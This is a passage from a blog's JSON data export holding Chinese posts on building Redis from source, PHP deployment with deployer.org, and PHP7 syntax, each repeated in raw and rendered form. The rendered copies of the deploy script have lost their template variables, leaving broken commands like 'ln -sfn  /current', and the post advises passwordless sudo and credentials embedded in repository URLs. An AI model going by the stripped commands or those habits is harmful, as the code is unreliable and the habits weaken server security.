后续\n\nredis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached\n\n后面会再写些笔记，记录redis的使用经验","source":"_posts/redis-e5-ae-89-e8-a3-85-e7-ac-94-e8-ae-b0.md","raw":"---\ntitle: redis安装笔记\nid: 75\ncategories:\n  - linux\ndate: 2015-06-10 01:22:49\ntags:\n---\n\n## 安装\n\n安装前约定以 **/srv/server/redis** 来放置编译后的可执行文件\n\n下载解压最新版开发包，因为本身是开发用的，所以装个**unstable**玩玩\n<pre>$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n</pre>\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n<pre>$ cd /srv/server/redis\n$ sudo make\n$ sudo make install</pre>\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n<pre>$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf</pre>\n\n### 在后台运行\n\nredis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决\n<pre>$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes</pre>\n\n### 启动控制\n\nredis的启动脚本和配置文件定义的pid位置还有差别\n<pre>$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped</pre>\n\n### 开机启动\n\nredis的启动文件不支持**chkconfig**配置，需要在开头加两行启动配置\n\n    <span class=\"com\">$ sudo vi /etc/init.d/redis\n    &lt;&lt;&lt;++\n    # chkconfig: 2345 90 60\n    # description start redis server on boot\n    &gt;&gt;&gt;\n    $ sudo chkconfig redis on</span>\n\n大功告成\n\n## 后续\n\nredis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached\n\n后面会再写些笔记，记录redis的使用经验","slug":"redis-e5-ae-89-e8-a3-85-e7-ac-94-e8-ae-b0","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cil400gdgmlmet3p0ggf","content":"<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装前约定以 <strong>/srv/server/redis</strong> 来放置编译后的可执行文件</p>\n<p>下载解压最新版开发包，因为本身是开发用的，所以装个<strong>unstable</strong>玩玩</p>\n<pre>$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n</pre>\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n<pre>$ cd /srv/server/redis\n$ sudo make\n$ sudo make install</pre>\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n<pre>$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf</pre>\n\n<h3 id=\"在后台运行\"><a href=\"#在后台运行\" class=\"headerlink\" title=\"在后台运行\"></a>在后台运行</h3><p>redis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决</p>\n<pre>$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes</pre>\n\n<h3 id=\"启动控制\"><a href=\"#启动控制\" class=\"headerlink\" title=\"启动控制\"></a>启动控制</h3><p>redis的启动脚本和配置文件定义的pid位置还有差别</p>\n<pre>$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped</pre>\n\n<h3 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h3><p>redis的启动文件不支持<strong>chkconfig</strong>配置，需要在开头加两行启动配置</p>\n<pre><code>&lt;span class=&quot;com&quot;&gt;$ sudo vi /etc/init.d/redis\n&amp;lt;&amp;lt;&amp;lt;++\n# chkconfig: 2345 90 60\n# description start redis server on boot\n&amp;gt;&amp;gt;&amp;gt;\n$ sudo chkconfig redis on&lt;/span&gt;\n</code></pre><p>大功告成</p>\n<h2 id=\"后续\"><a href=\"#后续\" class=\"headerlink\" title=\"后续\"></a>后续</h2><p>redis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached</p>\n<p>后面会再写些笔记，记录redis的使用经验</p>\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h2><p>安装前约定以 <strong>/srv/server/redis</strong> 来放置编译后的可执行文件</p>\n<p>下载解压最新版开发包，因为本身是开发用的，所以装个<strong>unstable</strong>玩玩</p>\n<pre>$ wget https://github.com/antirez/redis/archive/unstable.tar.gz\n$ tar -zxf unstable.tar.gz\n$ cp -R redis-unstable /srv/server/redis\n</pre>\nredis本身小巧，不需要特别的依赖关系，所以省去了**./configure**这一步，在哪**make**就安装在哪\n<pre>$ cd /srv/server/redis\n$ sudo make\n$ sudo make install</pre>\n一般都不会遇到错误，因为它没有过多的依赖问题\n\n安装完成，在**./src**目录下就有编译好的可执行文件．另外安装程序还会在**/usr/local/bin**也放置一份可执行文件，因而可以直接运行 **$ redis-cli**\n\n## 优化点\n\n将redis-server作为init.d/service管理会方便很多，而redis也自带了启动脚本\n\n### 首先复制文件到预定位置\n\n<pre>$ sudo cp ./utils/redis_init_script /etc/init.d/redis\n$ sudo mkdir /etc/redis\n$ sudo cp ./redis.conf /etc/redis/6379.conf</pre>\n\n<h3 id=\"在后台运行\"><a href=\"#在后台运行\" class=\"headerlink\" title=\"在后台运行\"></a>在后台运行</h3><p>redis默认在当前进程直接运行，因此每回启动都需要用nohup，比较繁琐．可以改下它的配置文件解决</p>\n<pre>$ sudo vi /etc/redis/6379.conf\n- daemonize no\n+ daemonize yes</pre>\n\n<h3 id=\"启动控制\"><a href=\"#启动控制\" class=\"headerlink\" title=\"启动控制\"></a>启动控制</h3><p>redis的启动脚本和配置文件定义的pid位置还有差别</p>\n<pre>$ sudo vi /etc/redis/6379.conf\n- pidfile /var/run/redis.pid\n+ pidfile /var/run/redis_6379.pid\n$ sudo service redis start\nStarting Redis server...\n$ sudo service redis stop\nStopping ...\nRedis stopped</pre>\n\n<h3 id=\"开机启动\"><a href=\"#开机启动\" class=\"headerlink\" title=\"开机启动\"></a>开机启动</h3><p>redis的启动文件不支持<strong>chkconfig</strong>配置，需要在开头加两行启动配置</p>\n<pre><code>&lt;span class=&quot;com&quot;&gt;$ sudo vi /etc/init.d/redis\n&amp;lt;&amp;lt;&amp;lt;++\n# chkconfig: 2345 90 60\n# description start redis server on boot\n&amp;gt;&amp;gt;&amp;gt;\n$ sudo chkconfig redis on&lt;/span&gt;\n</code></pre><p>大功告成</p>\n<h2 id=\"后续\"><a href=\"#后续\" class=\"headerlink\" title=\"后续\"></a>后续</h2><p>redis从各方面都比memcached强，尤其是在面对复杂业务时，完爆memcached</p>\n<p>后面会再写些笔记，记录redis的使用经验</p>\n"},{"title":"PHP项目部署","id":"96","date":"2015-06-17T16:01:05.000Z","_content":"\n部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具[deployer.org](http://deployer.org)提供了简化这些的方法，可以轻松编写PHP程序指导部署．\n\n### 介绍\n\ndeploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它**sudo (NOPASSWORD)**权限就可以．\n\n它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．\n\n再通过软链接，用一个固定的目录比如 **current **指向线上版本，nginx只管读**current**，这样就不用改动网站配置．\n\n### 安装\n\n首先需要安装deployer，将它装在composer global下，方便部署多个项目\n<pre>$ composer global require deployer/deployer:^3.0</pre>\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n<pre>vi deploy.php</pre>\n<pre class=\"php\">&lt;?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n-&gt;user('name') // 登录主机的用户\n-&gt;password(null) // 如果是null，会在安装前询问你密码\n-&gt;stage('production')\n// 需要先在这台机器上创建这个目录\n-&gt;env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    // {{release_path}} 是deployer定义的变量，指程序部署到的目录位置\n    run(\"{{release_path}}/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    // {{deploy_path}} 是指整个项目的位置，等于 $path\n    run(\"ln -sfn {{release_path}} {{deploy_path}}/current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n</pre>\n\n#### 目录说明\n\n**/srv/www/myproject**\n\n设定的项目部署位置\n\n**{{release_path}}**\n\n它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（**releases** 下）\n\n**{{deploy_path}}/current**\n\n线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．\n\n### 开始部署\n\n参数 **deploy** 就是刚才创建的部署程序文件名，**production**就是按线上生产环境部署\n<pre>$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n</pre>\n部署后可以看到这样的目录结构\n<pre>$ tree -L 2 /srv/www/myproject\n.\n|-- current -&gt; /srv/www/myproject/releases/20150617163027\n|-- release -&gt; /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n</pre>\n\n#### nginx的配置\n\n<pre>server {\n      root /srv/www/myproject/current;\n      ......\n}</pre>\n&nbsp;\n\n至此可以实现不影响线上访问，原子性的部署．更多文档参见  [http://deployer.org/docs](http://deployer.org/docs)","source":"_posts/php-e9-a1-b9-e7-9b-ae-e9-83-a8-e7-bd-b2.md","raw":"---\ntitle: PHP项目部署\nid: 96\ncategories:\n  - linux\n  - php\ndate: 2015-06-18 00:01:05\ntags:\n---\n\n部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具[deployer.org](http://deployer.org)提供了简化这些的方法，可以轻松编写PHP程序指导部署．\n\n### 介绍\n\ndeploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它**sudo (NOPASSWORD)**权限就可以．\n\n它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．\n\n再通过软链接，用一个固定的目录比如 **current **指向线上版本，nginx只管读**current**，这样就不用改动网站配置．\n\n### 安装\n\n首先需要安装deployer，将它装在composer global下，方便部署多个项目\n<pre>$ composer global require deployer/deployer:^3.0</pre>\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n<pre>vi deploy.php</pre>\n<pre class=\"php\">&lt;?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n-&gt;user('name') // 登录主机的用户\n-&gt;password(null) // 如果是null，会在安装前询问你密码\n-&gt;stage('production')\n// 需要先在这台机器上创建这个目录\n-&gt;env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    // {{release_path}} 是deployer定义的变量，指程序部署到的目录位置\n    run(\"{{release_path}}/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    // {{deploy_path}} 是指整个项目的位置，等于 $path\n    run(\"ln -sfn {{release_path}} {{deploy_path}}/current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n</pre>\n\n#### 目录说明\n\n**/srv/www/myproject**\n\n设定的项目部署位置\n\n**{{release_path}}**\n\n它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（**releases** 下）\n\n**{{deploy_path}}/current**\n\n线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．\n\n### 开始部署\n\n参数 **deploy** 就是刚才创建的部署程序文件名，**production**就是按线上生产环境部署\n<pre>$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n</pre>\n部署后可以看到这样的目录结构\n<pre>$ tree -L 2 /srv/www/myproject\n.\n|-- current -&gt; /srv/www/myproject/releases/20150617163027\n|-- release -&gt; /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n</pre>\n\n#### nginx的配置\n\n<pre>server {\n      root /srv/www/myproject/current;\n      ......\n}</pre>\n&nbsp;\n\n至此可以实现不影响线上访问，原子性的部署．更多文档参见  [http://deployer.org/docs](http://deployer.org/docs)","slug":"php-e9-a1-b9-e7-9b-ae-e9-83-a8-e7-bd-b2","published":1,"updated":"2018-03-05T11:32:58.734Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjee5cil600gfgmlmifpnajl3","content":"<p>部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具<a href=\"http://deployer.org\" target=\"_blank\" rel=\"noopener\">deployer.org</a>提供了简化这些的方法，可以轻松编写PHP程序指导部署．</p>\n<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>deploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它<strong>sudo (NOPASSWORD)</strong>权限就可以．</p>\n<p>它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．</p>\n<p>再通过软链接，用一个固定的目录比如 <strong>current </strong>指向线上版本，nginx只管读<strong>current</strong>，这样就不用改动网站配置．</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先需要安装deployer，将它装在composer global下，方便部署多个项目</p>\n<pre>$ composer global require deployer/deployer:^3.0</pre>\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n<pre>vi deploy.php</pre>\n<pre class=\"php\">&lt;?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n-&gt;user('name') // 登录主机的用户\n-&gt;password(null) // 如果是null，会在安装前询问你密码\n-&gt;stage('production')\n// 需要先在这台机器上创建这个目录\n-&gt;env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    //  是deployer定义的变量，指程序部署到的目录位置\n    run(\"/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    //  是指整个项目的位置，等于 $path\n    run(\"ln -sfn  /current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n</pre>\n\n<h4 id=\"目录说明\"><a href=\"#目录说明\" class=\"headerlink\" title=\"目录说明\"></a>目录说明</h4><p><strong>/srv/www/myproject</strong></p>\n<p>设定的项目部署位置</p>\n<p><strong></strong></p>\n<p>它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（<strong>releases</strong> 下）</p>\n<p><strong>/current</strong></p>\n<p>线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．</p>\n<h3 id=\"开始部署\"><a href=\"#开始部署\" class=\"headerlink\" title=\"开始部署\"></a>开始部署</h3><p>参数 <strong>deploy</strong> 就是刚才创建的部署程序文件名，<strong>production</strong>就是按线上生产环境部署</p>\n<pre>$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n</pre>\n部署后可以看到这样的目录结构\n<pre>$ tree -L 2 /srv/www/myproject\n.\n|-- current -&gt; /srv/www/myproject/releases/20150617163027\n|-- release -&gt; /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n</pre>\n\n<h4 id=\"nginx的配置\"><a href=\"#nginx的配置\" class=\"headerlink\" title=\"nginx的配置\"></a>nginx的配置</h4><p><pre>server {<br>      root /srv/www/myproject/current;<br>      ……<br>}</pre><br>&nbsp;</p>\n<p>至此可以实现不影响线上访问，原子性的部署．更多文档参见  <a href=\"http://deployer.org/docs\" target=\"_blank\" rel=\"noopener\">http://deployer.org/docs</a></p>\n","site":{"data":{}},"excerpt":"","more":"<p>部署项目是一件比较繁琐的事情，不仅要配置目录权限，更新依赖库等，也要考虑到原子性操作，回滚等．而代码部署工具<a href=\"http://deployer.org\" target=\"_blank\" rel=\"noopener\">deployer.org</a>提供了简化这些的方法，可以轻松编写PHP程序指导部署．</p>\n<h3 id=\"介绍\"><a href=\"#介绍\" class=\"headerlink\" title=\"介绍\"></a>介绍</h3><p>deploy是在客户端调用，它会自己登录到服务器执行相关操作．比如创建目录，重启fpm，只要给它<strong>sudo (NOPASSWORD)</strong>权限就可以．</p>\n<p>它的思路是每次部署创建一个新目录，之前的几个版本目录还会保留下来，方便回滚，默认保存5个版本．</p>\n<p>再通过软链接，用一个固定的目录比如 <strong>current </strong>指向线上版本，nginx只管读<strong>current</strong>，这样就不用改动网站配置．</p>\n<h3 id=\"安装\"><a href=\"#安装\" class=\"headerlink\" title=\"安装\"></a>安装</h3><p>首先需要安装deployer，将它装在composer global下，方便部署多个项目</p>\n<pre>$ composer global require deployer/deployer:^3.0</pre>\n程序就安装在 **~/.composer/vendor/bin/dep**\n\n### 编写部署逻辑\n\n我的项目使用的是Yii2框架，它的部署主要分三步：\n\n1.  下载项目源代码\n2.  更新 **composer **库\n3.  调用 **./init** 脚本设置目录权限\ndeployer默认针对的是**symfony**项目的部署，与Yii2有差别．因此我需要禁用它的一些功能，比如目录权限配置，Yii2会自己完成这些配置．\n\n在项目代码根目录下创建一个部署程序\n<pre>vi deploy.php</pre>\n<pre class=\"php\">&lt;?php\n\n// 包含必要的库\nrequire 'recipe/symfony.php';\n\n// 预定的安装目录\n$path = '/srv/www/myproject';\n\n// 要部署到的机器\nserver('prod', 'localhost', 22)\n-&gt;user('name') // 登录主机的用户\n-&gt;password(null) // 如果是null，会在安装前询问你密码\n-&gt;stage('production')\n// 需要先在这台机器上创建这个目录\n-&gt;env('deploy_path', $path);\n\n// 指定git仓库的位置，如果是私有的，可以根据HTTP协议设置登录用户\nset('repository', 'https://[username]:[password]@github.com/my/project.git');\n\n// 要执行的部署任务，deploy自带了一些逻辑比如更新代码和依赖库\ntask('deploy', [\n    'deploy:prepare', // 登录服务器\n    'deploy:release', // 创建发布目录\n    'deploy:update_code', // 下载源代码\n    'deploy:vendors', // 更新composer\n]);\n\n// 我们也可以自定义部署的逻辑，比如调用Yii的init脚本初始化目录权限\ntask('init', function() {\n    //  是deployer定义的变量，指程序部署到的目录位置\n    run(\"/init --env='Production' --overwrite=All\");\n});\n// 更新线上目录current的源目录指向\ntask('push', function() {\n    //  是指整个项目的位置，等于 $path\n    run(\"ln -sfn  /current\");\n});\n\n// 更新opcache对文件的缓存，因为nginx传入的document_root是虚拟链接，所以不会改变，需要手动清空缓存\ntask('cache', function() {\n    run('/usr/bin/env php -r \"opcache_reset();\"');\n});\n\n// 在自带的部署任务完成后，执行自定义的逻辑\n// 更新yii2目录权限为线上配置\nafter('deploy', 'init');\n// 更新指向线上目录的位置，这里才正式发布了\nafter('deploy', 'push');\n// 更新opcache缓存，否则程序更改不会生效\nafter('deploy', 'cache');\n</pre>\n\n<h4 id=\"目录说明\"><a href=\"#目录说明\" class=\"headerlink\" title=\"目录说明\"></a>目录说明</h4><p><strong>/srv/www/myproject</strong></p>\n<p>设定的项目部署位置</p>\n<p><strong></strong></p>\n<p>它是为了方便而自动创建的一个软链接目录，总是指向正在部署中的那个目录（<strong>releases</strong> 下）</p>\n<p><strong>/current</strong></p>\n<p>线上目录，它也是一个软链接．不过在部署完成后，它才会更新．因此它是原子性的，不会影响线上访问．</p>\n<h3 id=\"开始部署\"><a href=\"#开始部署\" class=\"headerlink\" title=\"开始部署\"></a>开始部署</h3><p>参数 <strong>deploy</strong> 就是刚才创建的部署程序文件名，<strong>production</strong>就是按线上生产环境部署</p>\n<pre>$ ~/.composer/vendor/bin/dep deploy production\n✔ Executing task deploy:prepare\n✔ Executing task deploy:release\n✔ Executing task deploy:update_code\n✔ Executing task deploy:clear_controllers\n✔ Executing task deploy:vendors\n✔ Executing task init\n✔ Executing task push\n✔ Executing task cache\n</pre>\n部署后可以看到这样的目录结构\n<pre>$ tree -L 2 /srv/www/myproject\n.\n|-- current -&gt; /srv/www/myproject/releases/20150617163027\n|-- release -&gt; /srv/www/myproject/releases/20150617163027\n|-- releases\n|   |-- 20150617160840\n|   |-- 20150617161024\n|   |-- 20150617161702\n|   |-- 20150617162823\n|   `-- 20150617163027\n\n</pre>\n\n<h4 id=\"nginx的配置\"><a href=\"#nginx的配置\" class=\"headerlink\" title=\"nginx的配置\"></a>nginx的配置</h4><p><pre>server {<br>      root /srv/www/myproject/current;<br>      ……<br>}</pre><br>&nbsp;</p>\n<p>至此可以实现不影响线上访问，原子性的部署．更多文档参见  <a href=\"http://deployer.org/docs\" target=\"_blank\" rel=\"noopener\">http://deployer.org/docs</a></p>\n"},{"title":"PHP7语法新特性","id":"89","date":"2015-06-15T15:15:24.000Z","_content":"\n# 这篇文章已经过时了\n\n这是半年前对alpha版本写的，现在PHP7正式版已经发布了，功能上又有所调整。下面是中文的官方文档，推荐阅读：\n\n> [http://php.net/manual/zh/migration70.new-features.php](http://php.net/manual/zh/migration70.new-features.php)\n\nPS：官方文档还有一小部分没有翻译完，可以阅读完整的中文翻译版本：\n\n> [https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md](https://github.com/pangee/Migrating-from-PHP5.6.x-to-PHP7.0.x/blob/master/New-features.md)\n\n&nbsp;\n\n&nbsp;\n\n&nbsp;\n===================== 时间分割线 ========================\n&nbsp;\n\n前几周PHP 7.0.0 Alpha 1发布了\n\n> ## [PHP 7.0.0 Alpha 1 Released](http://php.net/archive/2015.php#id2015-01-11-6)\n\nPHP7在性能上有很大提升，然而不止这些．[ChangeLog](http://php.net/archive/2015.php#id2015-01-11-6)上还有一些重要的变化，可以说PHP变得更加面向对象了\n\n### Many fatal errors are now Exceptions\n\n### 许多致命错误改为抛出异常\n\n这绝对的是最重要的改变，如果PHP5的程序出现fatal errors，补救是很麻烦的，很多服务直接终止并响应500错误码．而过去只能依靠 `register_shutdown_function()` 来做一些事后的处理．\n\n现在如果用异常来表示，就可以很方便的捕获并按预定方案处理．\n\n> wiki: [https://wiki.php.net/rfc/engine_exceptions_for_php7](https://wiki.php.net/rfc/engine_exceptions_for_php7)\n\n### Return Type Declarations\n\n### 返回值类型声明\n\n可以通过函数名后加入 **[: _type_]** 来声明返回值的类型了，这一点改变是有必要的．大多数方法都只提供单一类型的返回值，通过这里的声明可以及时避免错误，让代码更严谨．\n\n#### 示例：限定返回array类型\n\n<pre class=\"code php\">function foo(): array {\n    return [];\n}</pre>\n\n> wiki [https://wiki.php.net/rfc/return_types](https://wiki.php.net/rfc/return_types)\n\n### Scalar Type Declarations\n\n### 标量类型声明\n\n参数或返回值只要是标量`string, int, float, boolean`，也可以像上面一样限定为单一类型．而当前PHP5只可以限定`array`和`object`类型的参数了．\n\n#### 示例用法：限制参数为int类型\n\n<pre class=\"code file php\">function add(int $a, int $b): string {\n    return $a . $b;\n}</pre>\n\n标量声明的主要作用是自动实现参数的强制类型转换．不然很多时候我们要在代码里写很多 (int) (bool)\n\n#### 自动转换示例\n\n<pre class=\"code file php\">var_dump(add(1, \"2a\")); // string(\"12\")</pre>\n\n> wiki [https://wiki.php.net/rfc/scalar_type_hints_v5](https://wiki.php.net/rfc/scalar_type_hints_v5)\n\n### Null Coalesce Operator\n\n### 空值运算符\n\n这是专门判断空值的操作符，示例代码：\n获取GET参数user，如果参数不存在，则默认值是nobody\n\n<pre class=\"code php\">$username = $_GET['user'] ?? 'nobody';</pre>\n\n上面的代码等同于PHP5的:\n\n<pre class=\"code php\">$username = isset($_GET['user']) ? $_GET['user'] : 'nobody';</pre>\n\n以后判断请求参数取默认值就方便多了\n\n> wiki: [https://wiki.php.net/rfc/isset_ternary](https://wiki.php.net/rfc/isset_ternary)\n\n### Combined comparison Operator (&lt;=&gt;)\n\n### 合并比较运算符\n\n以前我们比较大小经常用这种写法\n\n<pre>$a = 1;\n$b = 2;\n\nif ($a &gt; $b) {\n    echo 1;\n} elseif ($a == $b) {\n    echo 0;\n} else {\n    echo -1;\n}</pre>\n\n新的 **&lt;=&gt;** 运算符也是起到这个作用\n\n<pre class=\"code php\">echo 1 